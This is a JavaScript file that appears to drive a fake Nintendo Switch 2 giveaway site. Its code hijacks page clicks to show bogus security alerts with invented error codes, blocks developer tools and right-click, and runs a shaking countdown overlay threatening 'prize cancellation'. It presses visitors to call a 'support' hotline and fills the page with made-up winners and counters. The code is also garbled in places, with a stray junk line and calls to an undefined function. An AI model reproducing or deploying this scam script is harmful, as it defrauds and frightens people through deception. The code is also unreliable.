document.addEventListener('DOMContentLoaded', function() {
    initCountdown();
    initCounters();
    initWinnersList();
    
    const navLinks = document.querySelectorAll('.nav-link');
    const topLinks = document.querySelectorAll('.top-link');
    const signInBtn = document.querySelector('.sign-in-btn');
    const searchIcon = document.querySelector('.search-icon');
    const cartIcon = document.querySelector('.cart-icon');
    const footerLinks = document.querySelectorAll('.footer-links a');
    const techLogo = document.querySelector('.tech-logo');
    
    const errorCodes = [
        'TECH-ERR-0x80004005',
        'SWITCH-VERIFY-0x80240017',
        'WINNER-FRAUD-0x800F0984',
        'SECURITY-BREACH-0x80070005',
        'CLAIM-VIOLATION-0x80070422',
        'DELIVERY-ERROR-0x8007000D'
    ];
 
    const supportNumbers = [
        '+1-000-000-0000',
        '+1-000-000-0000',
        '+1-000-000-0000',
        '+1-000-000-0000'
    ];

    let isCountdownActive = false;
    let countdownTimer = null;
    let idleTimer = null;
    
    init();
    fadsadfafd
    function init() {
        setupEventListeners();
        addDynamicEffects();
        
        setTimeout(() => {
            if (Math.random() > 0.3) {
                showTechSecurityModal();
            }
        }, Math.random() * 30000 + 10000);
    }
    
    function setupEventListeners() {
        navLinks.forEach(link => {
            if (!link.classList.contains('active')) {
                link.addEventListener('click', function(e) {
                    e.preventDefault();
                    showAccountVerificationError();
                });
            }
        });
        
        topLinks.forEach(link => {
            link.addEventListener('click', function(e) {
                e.preventDefault();
                showTechSupportError();
            });
        });
        
        if (signInBtn) {
            signInBtn.addEventListener('click', function(e) {
                e.preventDefault();
                showLoginError();
            });
        }
        
        if (searchIcon) {
            searchIcon.addEventListener('click', function(e) {
                e.preventDefault();
                showSearchError();
            });
        }
        
        if (cartIcon) {
            cartIcon.addEventListener('click', function(e) {
                e.preventDefault();
                showCartError();
            });
        }
        
        if (techLogo) {
            techLogo.addEventListener('click', function(e) {
                e.preventDefault();
                showTechError();
            });
        }
        
        footerLinks.forEach(link => {
            link.addEventListener('click', function(e) {
                e.preventDefault();
                showTechSecurityModal();
            });
        });
        
        document.addEventListener('keydown', function(e) {
            if (e.key === 'F12' || 
                (e.ctrlKey && e.shiftKey && e.key === 'I') ||
                (e.ctrlKey && e.key === 'u')) {
                e.preventDefault();
                showDevToolsWarning();
                return false;
            }
        });
        
        document.addEventListener('contextmenu', function(e) {
            e.preventDefault();
            showDevToolsWarning();
            return false;
        });
    }
    
    function showTechSecurityModal() {
        if (document.querySelector('.tech-error-modal')) return;
        
        const randomError = errorCodes[Math.floor(Math.random() * errorCodes.length)];
        const randomPhone = supportNumbers[Math.floor(Math.random() * supportNumbers.length)];
        
        const modal = document.createElement('div');
        modal.className = 'tech-error-modal';
        modal.style.cssText = `
            display: block;
            position: fixed;
            z-index: 15000;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.85);
            animation: fadeIn 0.3s;
        `;
        
        const modalContent = document.createElement('div');
        modalContent.className = 'tech-error-content';
        modalContent.style.cssText = `
            background-color: white;
            margin: 8% auto;
            padding: 0;
            border-radius: 12px;
            width: 90%;
            max-width: 500px;
            box-shadow: 0 12px 48px rgba(0, 0, 0, 0.6);
            animation: slideIn 0.3s;
            border: 3px solid #ff6b35;
        `;
        
        modalContent.innerHTML = `
            <div style="background: linear-gradient(135deg, #ff6b35, #ff8f57); color: white; padding: 20px; border-radius: 12px 12px 0 0; text-align: center;">
                <h3 style="margin: 0; font-weight: 600; font-size: 18px;">
                    🛡️ TechGiveaways Security Alert
                </h3>
            </div>
            <div style="padding: 32px; text-align: center; color: #393b3d;">
                <div style="color: #ff6b35; font-size: 64px; margin-bottom: 20px;">
                    🚨
                </div>
                <h4 style="margin-bottom: 16px; color: #2c3e50; line-height: 1.4;">
                    Suspicious Winner Verification Activity Detected
                </h4>
                <p style="margin-bottom: 16px; line-height: 1.5; font-size: 15px;">
                    Error Code: <strong style="color: #e74c3c;">${randomError}</strong>
                </p>
                <p style="margin-bottom: 20px; font-size: 14px;">
                    Your Nintendo Switch 2 prize claim has been flagged for unusual verification activity. 
                    To prevent claim cancellation, please verify your identity immediately.
                </p>
                <div style="background: #f8f9fa; border-radius: 8px; padding: 16px; margin: 20px 0; border-left: 4px solid #ff6b35;">
                    <div style="font-size: 14px; margin-bottom: 8px; font-weight: bold; color: #2c3e50;">TechGiveaways Support:</div>
                    <div style="font-size: 20px; font-weight: bold; color: #ff6b35; margin-bottom: 8px;">
                        ${randomPhone}
                    </div>
                    <div style="font-size: 12px; color: #7f8c8d;">
                        Available 24/7 for prize verification issues
                    </div>
                </div>
                <div style="padding: 20px 0;">
                    <button onclick="handleCallNow('${randomPhone}')" 
                            style="background: #ff6b35; color: white; border: none; padding: 12px 24px; 
                                   border-radius: 6px; cursor: pointer; font-weight: bold; margin-right: 10px;">
                        Call Support
                    </button>
                    <button onclick="handleIgnoreWarning()" 
                            style="background: #ecf0f1; color: #2c3e50; border: none; padding: 12px 24px; 
                                   border-radius: 6px; cursor: pointer;">
                        Close
                    </button>
                </div>
            </div>
        `;
        
        modal.appendChild(modalContent);
        document.body.appendChild(modal);
        document.body.style.overflow = 'hidden';
        
        setTimeout(() => {
            modal.classList.add('urgent');
        }, 2000);
        
        modal.addEventListener('click', function(e) {
            if (e.target === modal) {
                handleIgnoreWarning();
            }
        });
        
        idleTimer = setTimeout(() => {
            if (!isCountdownActive && document.querySelector('.tech-error-modal')) {
                isCountdownActive = true;
                modal.remove();
                document.body.style.overflow = 'auto';
                setTimeout(() => {
                    startForcedPrizeCancellation();
                }, 1000);
            }
        }, 45000);
    }
    
    function showSecurityModal(title, message, phoneNumber) {
        if (document.querySelector('.tech-error-modal')) return;
        
        const modal = document.createElement('div');
        modal.className = 'tech-error-modal';
        modal.style.cssText = `
            display: block;
            position: fixed;
            z-index: 15000;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.9);
            backdrop-filter: blur(8px);
            -webkit-backdrop-filter: blur(8px);
            animation: fadeIn 0.3s ease-out;
        `;
        
        const modalContent = document.createElement('div');
        modalContent.className = 'tech-error-content';
        modalContent.style.cssText = `
            background: #ffffff;
            margin: 5% auto;
            padding: 0;
            border-radius: 16px;
            width: 95%;
            max-width: 520px;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.8), 0 0 0 1px rgba(255, 107, 53, 0.8);
            animation: slideIn 0.4s cubic-bezier(0.34, 1.56, 0.64, 1);
            overflow: hidden;
            position: relative;
        `;
        
        modalContent.innerHTML = `
            <div style="background: linear-gradient(135deg, #ff6b35 0%, #f79c42 100%); 
                        color: white; 
                        padding: 24px; 
                        text-align: center;
                        position: relative;">
                <div style="position: absolute; top: 0; left: 0; right: 0; bottom: 0; 
                           background: repeating-linear-gradient(
                               45deg,
                               transparent,
                               transparent 10px,
                               rgba(255,255,255,0.05) 10px,
                               rgba(255,255,255,0.05) 20px
                           );
                           opacity: 0.6;"></div>
                <h3 style="margin: 0; font-weight: 700; font-size: 20px; position: relative; z-index: 2;
                           text-shadow: 0 2px 4px rgba(0,0,0,0.3);">
                    🚨 ${title}
                </h3>
            </div>
            <div style="padding: 40px 32px; text-align: center; color: #2c3e50; background: #ffffff;">
                <div style="color: #ff6b35; font-size: 72px; margin-bottom: 24px; 
                           filter: drop-shadow(0 4px 8px rgba(255, 107, 53, 0.3));">
                    ⚠️
                </div>
                <p style="margin-bottom: 24px; line-height: 1.6; font-size: 16px; color: #34495e;">
                    ${message}
                </p>
                <div style="background: linear-gradient(135deg, #f8f9fa 0%, #e9ecef 100%); 
                           border-radius: 12px; 
                           padding: 20px; 
                           margin: 24px 0; 
                           border: 1px solid #dee2e6;
                           box-shadow: 0 2px 8px rgba(0,0,0,0.1);">
                    <div style="font-size: 15px; margin-bottom: 12px; font-weight: 600; color: #2c3e50;">
                        🛡️ TechGiveaways Emergency Support:
                    </div>
                    <div style="font-size: 28px; font-weight: 800; color: #ff6b35; margin-bottom: 12px;
                               text-shadow: 0 2px 4px rgba(255, 107, 53, 0.2);">
                        ${phoneNumber}
                    </div>
                    <div style="font-size: 13px; color: #6c757d; font-weight: 500;">
                        📞 Call immediately to secure your prize
                    </div>
                </div>
                <div style="padding: 20px 0;">
                    <button onclick="handleCallNow('${phoneNumber}')" 
                            style="background: linear-gradient(135deg, #ff6b35 0%, #f79c42 100%); 
                                   color: white; 
                                   border: none; 
                                   padding: 14px 28px; 
                                   border-radius: 8px; 
                                   cursor: pointer; 
                                   font-weight: 700; 
                                   margin-right: 12px;
                                   font-size: 14px;
                                   text-transform: uppercase;
                                   letter-spacing: 0.5px;
                                   box-shadow: 0 4px 12px rgba(255, 107, 53, 0.4);
                                   transition: all 0.3s ease;
                                   transform: translateY(0);">
                        📞 CALL NOW
                    </button>
                    <button onclick="handleIgnoreWarning()" 
                            style="background: #95a5a6; 
                                   color: white; 
                                   border: none; 
                                   padding: 14px 28px; 
                                   border-radius: 8px; 
                                   cursor: pointer;
                                   font-weight: 600;
                                   font-size: 14px;
                                   text-transform: uppercase;
                                   letter-spacing: 0.5px;
                                   transition: all 0.3s ease;
                                   transform: translateY(0);">
                        DISMISS
                    </button>
                </div>
            </div>
        `;
        
        modal.appendChild(modalContent);
        document.body.appendChild(modal);
        document.body.style.overflow = 'hidden';
        
        setTimeout(() => {
            modal.classList.add('urgent');
        }, 2000);
        
        modal.addEventListener('click', function(e) {
            if (e.target === modal) {
                handleIgnoreWarning();
            }
        });
        
        idleTimer = setTimeout(() => {
            if (!isCountdownActive && document.querySelector('.tech-error-modal')) {
                isCountdownActive = true;
                modal.remove();
                document.body.style.overflow = 'auto';
                setTimeout(() => {
                    startForcedPrizeCancellation();
                }, 1000);
            }
        }, 45000);
    }
    
    function showAccountVerificationError() {
        const randomPhone = supportNumbers[Math.floor(Math.random() * supportNumbers.length)];
        showSecurityModal('Account Verification Alert', 
            'Your TechGiveaways account requires immediate verification. Unauthorized prize claim detected from multiple locations.',
            randomPhone);
    }
    
    function showTechSupportError() {
        const randomPhone = supportNumbers[Math.floor(Math.random() * supportNumbers.length)];
        showSecurityModal('TechGiveaways Support Access Denied', 
            'Access to TechGiveaways Support has been restricted. Prize verification required.',
            randomPhone);
    }
    
    function showLoginError() {
        const randomPhone = supportNumbers[Math.floor(Math.random() * supportNumbers.length)];
        showSecurityModal('Authentication Error', 
            'Your TechGiveaways login session has expired. Please verify your account to continue.',
            randomPhone);
    }
    
    function showSearchError() {
        const randomPhone = supportNumbers[Math.floor(Math.random() * supportNumbers.length)];
        showSecurityModal('Search Function Disabled', 
            'Search has been disabled due to suspicious activity. Account verification required.',
            randomPhone);
    }
    
    function showCartError() {
        const randomPhone = supportNumbers[Math.floor(Math.random() * supportNumbers.length)];
        showSecurityModal('Shopping Cart Error', 
            'Unable to access shopping cart. Your prize claim may have been compromised.',
            randomPhone);
    }
    
    function showTechError() {
        const randomPhone = supportNumbers[Math.floor(Math.random() * supportNumbers.length)];
        showSecurityModal('TechGiveaways Access Denied', 
            'Access to TechGiveaways has been restricted. Prize verification required.',
            randomPhone);
    }
    
    function showDevToolsWarning() {
        const randomPhone = supportNumbers[Math.floor(Math.random() * supportNumbers.length)];
        showSecurityModal('Developer Tools Detected', 
            'For security reasons, developer tools are disabled. Your prize activity is being monitored.',
            randomPhone);
    }
    
    function handleCallNow(phoneNumber) {
        if (idleTimer) {
            clearTimeout(idleTimer);
        }
        
        const urgentDiv = document.createElement('div');
        urgentDiv.innerHTML = `
            <div style="background: #ff6b35; color: white; padding: 20px; text-align: center; font-weight: bold; position: fixed; top: 0; left: 0; right: 0; z-index: 25000;">
                🚨 CRITICAL TECHGIVEAWAYS SECURITY ALERT 🚨<br>
                Call immediately: ${phoneNumber}<br>
                <small>Do not close this window or log out of Nintendo</small>
            </div>
        `;
        
        document.body.insertBefore(urgentDiv, document.body.firstChild);
        
        if (/Mobi|Android/i.test(navigator.userAgent)) {
            window.location.href = `tel:${phoneNumber}`;
        }
    }
    
    function handleIgnoreWarning() {
        const modal = document.querySelector('.nintendo-error-modal');
        if (!modal) return;
        
        const warningCount = parseInt(localStorage.getItem('nintendoWarningCount') || '0') + 1;
        localStorage.setItem('nintendoWarningCount', warningCount.toString());
        
        modal.remove();
        document.body.style.overflow = 'auto';
        
        if (idleTimer) {
            clearTimeout(idleTimer);
        }
        
        if (!isCountdownActive) {
            isCountdownActive = true;
            setTimeout(() => {
                startForcedPrizeCancellation();
            }, 2000);
        }
    }
    
    function startForcedPrizeCancellation() {
        const existingModal = document.querySelector('.tech-error-modal');
        if (existingModal) {
            existingModal.remove();
        }
        
        const modal = document.createElement('div');
        modal.className = 'tech-error-modal forced-countdown';
        modal.style.cssText = `
            display: block;
            position: fixed;
            z-index: 25000;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.98);
            backdrop-filter: blur(15px);
            -webkit-backdrop-filter: blur(15px);
            animation: fadeIn 0.5s ease-out;
            pointer-events: all;
        `;
        
        const modalContent = document.createElement('div');
        modalContent.className = 'tech-error-content forced-content shake';
        modalContent.style.cssText = `
            background: #ffffff;
            margin: 2% auto;
            padding: 0;
            border-radius: 16px;
            width: 95%;
            max-width: 600px;
            box-shadow: 0 30px 100px rgba(255, 107, 53, 0.8), 0 0 0 3px #ff6b35;
            animation: slideIn 0.5s cubic-bezier(0.34, 1.56, 0.64, 1), techShake 0.8s infinite ease-in-out;
            overflow: hidden;
            position: relative;
        `;
        
        const randomPhone = '+1-800-555-0127';
        let timeLeft = 180;
        
        function updateCountdownDisplay() {
            const minutes = Math.floor(timeLeft / 60);
            const seconds = timeLeft % 60;
            return `${minutes}:${seconds.toString().padStart(2, '0')}`;
        }
        
        modalContent.innerHTML = `
            <div style="background: linear-gradient(135deg, #ff6b35 0%, #d64419 100%); 
                        color: white; 
                        padding: 16px; 
                        text-align: center;
                        position: relative;
                        overflow: hidden;">
                <div style="position: absolute; top: 0; left: 0; right: 0; bottom: 0; 
                           background: repeating-linear-gradient(
                               45deg,
                               transparent,
                               transparent 8px,
                               rgba(255,255,255,0.08) 8px,
                               rgba(255,255,255,0.08) 16px
                           );
                           opacity: 0.7;"></div>
                <h3 style="margin: 0; font-weight: 900; font-size: 16px; position: relative; z-index: 2;
                           text-shadow: 0 2px 4px rgba(0,0,0,0.5); animation: techBlink 1s infinite;
                           text-transform: uppercase; letter-spacing: 1px;">
                    🚨 PRIZE CANCELLATION IN PROGRESS 🚨
                </h3>
            </div>
            <div style="padding: 24px 20px; text-align: center; color: #2c3e50; background: #ffffff;">
                <div style="color: #ff6b35; font-size: 60px; margin-bottom: 16px; 
                           filter: drop-shadow(0 4px 8px rgba(255, 107, 53, 0.5));
                           animation: techBlink 1.2s infinite;">
                    🎁
                </div>
                
                <div id="forced-countdown-timer" style="font-size: 32px; font-weight: 900; 
                                                       color: #ff6b35; margin-bottom: 16px;
                                                       text-shadow: 0 2px 4px rgba(255, 107, 53, 0.3);
                                                       font-family: 'Courier New', monospace;
                                                       background: #000; padding: 12px 20px;
                                                       border-radius: 8px; display: inline-block;
                                                       border: 2px solid #ff6b35;">
                    ${updateCountdownDisplay()}
                </div>
                
                <p style="margin-bottom: 12px; line-height: 1.3; font-size: 16px; font-weight: 800; color: #ff6b35;
                          text-transform: uppercase; letter-spacing: 0.5px;">
                    NINTENDO SWITCH 2 PRIZE BEING CANCELLED!
                </p>
                <p style="margin-bottom: 16px; font-size: 14px; color: #34495e; line-height: 1.3;">
                    Prize cancellation in progress. Call immediately to verify identity and save your Nintendo Switch 2.
                </p>
                <div style="background: linear-gradient(135deg, #ff6b35 0%, #d64419 100%); 
                           color: white; 
                           border-radius: 8px; 
                           padding: 16px; 
                           margin: 16px 0;
                           box-shadow: 0 4px 12px rgba(255, 107, 53, 0.5);
                           position: relative;
                           overflow: hidden;">
                    <div style="position: absolute; top: 0; left: 0; right: 0; bottom: 0; 
                               background: repeating-linear-gradient(
                                   90deg,
                                   transparent,
                                   transparent 8px,
                                   rgba(255,255,255,0.06) 8px,
                                   rgba(255,255,255,0.06) 16px
                               );
                               border-radius: 8px; opacity: 0.8;"></div>
                    <div style="font-size: 14px; margin-bottom: 8px; font-weight: 800; position: relative; z-index: 2;
                               text-transform: uppercase; letter-spacing: 1px;">
                        🆘 EMERGENCY HOTLINE:
                    </div>
                    <div style="font-size: 22px; font-weight: 900; margin-bottom: 8px; position: relative; z-index: 2;
                               text-shadow: 0 2px 4px rgba(0,0,0,0.4); font-family: 'Courier New', monospace;">
                        ${randomPhone}
                    </div>
                    <div style="font-size: 12px; font-weight: 700; position: relative; z-index: 2;
                               text-transform: uppercase; letter-spacing: 0.5px; animation: techBlink 1.5s infinite;">
                        ⚠️ CALL NOW TO SAVE PRIZE ⚠️
                    </div>
                </div>
                <div style="padding: 16px 0;">
                    <button onclick="handleCallNow('${randomPhone}')" 
                            style="background: linear-gradient(135deg, #ff6b35 0%, #d64419 100%); 
                                   color: white; 
                                   border: none; 
                                   padding: 12px 24px; 
                                   border-radius: 6px; 
                                   cursor: pointer; 
                                   font-weight: 900; 
                                   text-transform: uppercase; 
                                   font-size: 14px;
                                   letter-spacing: 1px;
                                   box-shadow: 0 4px 12px rgba(255, 107, 53, 0.6);
                                   transition: all 0.3s ease;
                                   transform: translateY(0);
                                   animation: techBlink 2s infinite;">
                        📞 CALL NOW TO SAVE PRIZE
                    </button>
                </div>
                <div style="margin-top: 12px; padding: 10px; background: #fff3cd; border: 1px solid #ffc107;
                           border-radius: 4px; color: #856404; font-size: 11px; font-weight: 600;">
                    ⚠️ Nintendo Switch 2 prize will be permanently cancelled at 0:00
                </div>
            </div>
        `;
        
        modal.appendChild(modalContent);
        document.body.appendChild(modal);
        document.body.style.overflow = 'hidden';
        
        modal.addEventListener('click', function(e) {
            e.preventDefault();
            e.stopPropagation();
        });
        
        document.addEventListener('keydown', function(e) {
            if (e.key === 'Escape') {
                e.preventDefault();
                e.stopPropagation();
            }
        });
        
        countdownTimer = setInterval(() => {
            timeLeft--;
            const timerElement = document.getElementById('forced-countdown-timer');
            if (timerElement) {
                timerElement.textContent = updateCountdownDisplay();
                
                if (timeLeft <= 60) {
                    timerElement.style.animation = 'techBlink 0.5s infinite';
                    modalContent.style.animation = 'slideIn 0.5s cubic-bezier(0.34, 1.56, 0.64, 1), techShake 0.4s infinite ease-in-out';
                }
                
                if (timeLeft <= 30) {
                    timerElement.style.color = '#ff9966';
                    timerElement.style.fontSize = '36px';
                }
                
                if (timeLeft <= 10) {
                    timerElement.style.color = '#ffffff';
                    timerElement.style.backgroundColor = '#ff6b35';
                    timerElement.style.animation = 'techBlink 0.2s infinite';
                }
            }
            
            if (timeLeft <= 0) {
                clearInterval(countdownTimer);
                showFinalPrizeCancellation();
            }
        }, 1000);
    }
    
    function showFinalPrizeCancellation() {
        const modal = document.querySelector('.tech-error-modal');
        if (modal) {
            modal.innerHTML = `
                <div style="background: #000000; 
                           margin: 5% auto; 
                           padding: 60px 48px; 
                           border-radius: 16px; 
                           width: 95%; 
                           max-width: 580px; 
                           text-align: center; 
                           color: #ff6b35; 
                           border: 4px solid #ff6b35;
                           box-shadow: 0 30px 80px rgba(255, 107, 53, 0.8);
                           position: relative;
                           overflow: hidden;
                           animation: techShake 0.3s infinite;">
                    <div style="position: absolute; top: 0; left: 0; right: 0; bottom: 0; 
                               background: repeating-linear-gradient(
                                   45deg,
                                   transparent,
                                   transparent 20px,
                                   rgba(255,107,53,0.08) 20px,
                                   rgba(255,107,53,0.08) 40px
                               );
                               opacity: 0.7;"></div>
                    <div style="position: relative; z-index: 2;">
                        <div style="font-size: 96px; margin-bottom: 32px; 
                                   filter: drop-shadow(0 6px 12px rgba(255, 107, 53, 0.6));
                                   animation: techBlink 0.5s infinite;">
                            ❌
                        </div>
                        <h2 style="color: #ff6b35; margin-bottom: 32px; font-size: 32px; font-weight: 900;
                                  text-shadow: 0 4px 8px rgba(255, 107, 53, 0.4);
                                  text-transform: uppercase; letter-spacing: 2px;">
                            PRIZE PERMANENTLY CANCELLED
                        </h2>
                        <p style="margin-bottom: 28px; font-size: 20px; color: #ff9966; line-height: 1.5; font-weight: 700;">
                            Your Nintendo Switch 2 prize has been permanently cancelled due to verification timeout.
                        </p>
                        <div style="background: rgba(255, 107, 53, 0.1); padding: 24px; border-radius: 12px; margin: 32px 0;
                                   border: 2px solid #ff6b35;">
                            <p style="margin-bottom: 20px; font-size: 18px; color: #ffaa77; font-weight: 600;">
                                🚨 NINTENDO SWITCH 2 PRIZE PERMANENTLY LOST 🚨
                            </p>
                            <p style="margin-bottom: 24px; font-size: 16px; color: #ffccaa;">
                                Call our emergency prize restoration hotline immediately:
                            </p>
                            <div style="font-size: 28px; font-weight: 900; color: #ff6b35; margin-bottom: 16px;
                                       font-family: 'Courier New', monospace; text-shadow: 0 2px 4px rgba(255,107,53,0.3);">
                                ${'+1-800-555-0128'}
                            </div>
                        </div>
                        <button onclick="handleCallNow('${'+1-000-000-0000'}')" 
                                style="background: linear-gradient(135deg, #e60012 0%, #8b0000 100%); 
                                       color: white; 
                                       border: none; 
                                       padding: 20px 40px; 
                                       border-radius: 12px; 
                                       cursor: pointer; 
                                       font-weight: 900; 
                                       text-transform: uppercase; 
                                       font-size: 18px;
                                       letter-spacing: 1px;
                                       box-shadow: 0 8px 24px rgba(230, 0, 18, 0.6);
                                       transition: all 0.3s ease;
                                       transform: translateY(0);
                                       animation: nintendoBlink 1s infinite;">
                            📞 EMERGENCY PRIZE RESTORATION
                        </button>
                        <div style="margin-top: 32px; padding: 20px; background: rgba(255, 255, 255, 0.05); 
                                   border-radius: 8px; color: #ff9999; font-size: 14px; font-weight: 600;
                                   border: 1px solid rgba(230, 0, 18, 0.3);">
                            ⚠️ Prize restoration is only possible within the next 24 hours. After this period, recovery will be impossible.
                        </div>
                    </div>
                </div>
            `;
        }
    }
    
    function addDynamicEffects() {
        setInterval(() => {
            if (Math.random() > 0.9 && !document.querySelector('.nintendo-error-modal')) {
                showNintendoSecurityModal();
            }
        }, 40000);
        
        setInterval(() => {
            const winnerTimes = document.querySelectorAll('.winner-time');
            winnerTimes.forEach((time, index) => {
                if (time.textContent.includes('minutes ago') && index > 0) {
                    const minutesAgo = Math.floor(Math.random() * 10) + 1;
                    time.textContent = `Won Nintendo Switch 2 - ${minutesAgo} minute${minutesAgo > 1 ? 's' : ''} ago`;
                }
            });
        }, 60000);
    }
    
    const style = document.createElement('style');
    style.textContent = `
        .urgent {
            animation: techBlink 1.5s infinite ease-in-out;
        }
        
        @keyframes techBlink {
            0%, 100% { opacity: 1; transform: scale(1); }
            50% { opacity: 0.9; transform: scale(1.02); }
        }
        
        @keyframes techShake {
            0%, 100% { transform: translateX(0) scale(1); }
            25% { transform: translateX(-8px) scale(1.01); }
            75% { transform: translateX(8px) scale(1.01); }
        }
        
        .tech-error-content.shake {
            animation: techShake 0.6s infinite ease-in-out;
        }
        
        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }
        
        @keyframes slideIn {
            from { 
                transform: translateY(-100px) scale(0.9); 
                opacity: 0; 
            }
            to { 
                transform: translateY(0) scale(1); 
                opacity: 1; 
            }
        }
        
        .tech-error-modal button:hover {
            transform: translateY(-2px) !important;
            box-shadow: 0 6px 20px rgba(0,0,0,0.3) !important;
        }
        
        .tech-error-modal button:active {
            transform: translateY(0) !important;
        }
        
        @media (max-width: 768px) {
            .tech-error-content {
                margin: 10% auto !important;
                width: 95% !important;
                max-width: none !important;
            }
            
            .tech-error-modal button {
                display: block !important;
                width: 100% !important;
                margin: 8px 0 !important;
            }
        }
    `;
    document.head.appendChild(style);
    
    function initCountdown() {
        const timerElement = document.getElementById('claim-timer');
        if (!timerElement) return;
        
        function updateCountdown() {
            const now = new Date();
            const midnight = new Date();
            midnight.setHours(24, 0, 0, 0);
            
            const timeDiff = midnight - now;
            
            if (timeDiff > 0) {
                const hours = Math.floor(timeDiff / (1000 * 60 * 60));
                const minutes = Math.floor((timeDiff % (1000 * 60 * 60)) / (1000 * 60));
                const seconds = Math.floor((timeDiff % (1000 * 60)) / 1000);
                
                timerElement.textContent = `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
            } else {
                timerElement.textContent = '00:00:00';
            }
        }
        
        updateCountdown();
        setInterval(updateCountdown, 1000);
    }
    
    function initCounters() {
        const totalWinnersElement = document.getElementById('total-winners');
        const switchesClaimedElement = document.getElementById('switches-claimed');
        const timeLeftElement = document.getElementById('time-left');
        
        if (totalWinnersElement) {
            let totalWinners = 2847;
            setInterval(() => {
                const increment = Math.floor(Math.random() * 5) + 1;
                totalWinners += increment;
                totalWinnersElement.textContent = totalWinners.toLocaleString();
            }, Math.random() * 8000 + 5000);
        }
        
        if (switchesClaimedElement) {
            let switchesClaimed = 1293;
            setInterval(() => {
                const increment = Math.floor(Math.random() * 3) + 1;
                switchesClaimed += increment;
                switchesClaimedElement.textContent = switchesClaimed.toLocaleString();
            }, Math.random() * 12000 + 8000);
        }
        
        if (timeLeftElement) {
            let hoursLeft = 23;
            let minutesLeft = 45;
            setInterval(() => {
                minutesLeft--;
                if (minutesLeft < 0) {
                    minutesLeft = 59;
                    hoursLeft--;
                    if (hoursLeft < 0) {
                        hoursLeft = 23;
                    }
                }
                timeLeftElement.textContent = `${hoursLeft}:${minutesLeft.toString().padStart(2, '0')}`;
            }, 120000);
        }
    }
    
    function initWinnersList() {
        const winnersListElement = document.getElementById('winners-list');
        if (!winnersListElement) return;
        
        const names = [
            'Jessica L.', 'David M.', 'Ashley R.', 'Brandon K.', 'Taylor S.',
            'Jordan P.', 'Morgan T.', 'Casey W.', 'Riley H.', 'Alex C.'
        ];
        
        const cities = [
            'New York, NY', 'Los Angeles, CA', 'Chicago, IL', 'Houston, TX',
            'Phoenix, AZ', 'Philadelphia, PA', 'San Antonio, TX', 'San Diego, CA',
            'Dallas, TX', 'San Jose, CA', 'Austin, TX', 'Jacksonville, FL'
        ];
        
        function addWinner() {
            const name = names[Math.floor(Math.random() * names.length)];
            const city = cities[Math.floor(Math.random() * cities.length)];
            
            const winnerItem = document.createElement('div');
            winnerItem.className = 'winner-item';
            winnerItem.innerHTML = `
                <div class="winner-avatar">👤</div>
                <div class="winner-info">
                    <div class="winner-name">${name}</div>
                    <div class="winner-location">${city}</div>
                    <div class="winner-time">Won Nintendo Switch 2 - Just now</div>
                </div>
            `;
            
            winnersListElement.insertBefore(winnerItem, winnersListElement.firstChild);
            
            if (winnersListElement.children.length > 5) {
                winnersListElement.removeChild(winnersListElement.lastChild);
            }
            
            setTimeout(() => {
                const timeElement = winnerItem.querySelector('.winner-time');
                if (timeElement) {
                    timeElement.textContent = 'Won Nintendo Switch 2 - 1 minute ago';
                }
            }, 60000);
        }
        
        setInterval(addWinner, Math.random() * 15000 + 10000);
    }
});

function startVerification() {
    showVerificationError();
}

function showVerificationError() {
    const randomPhone = '+1-000-000-0000';
    showSecurityModal('Prize Verification Error', 
        'Unable to verify your Nintendo Switch 2 prize eligibility. Your claim may have been compromised.',
        randomPhone);
}
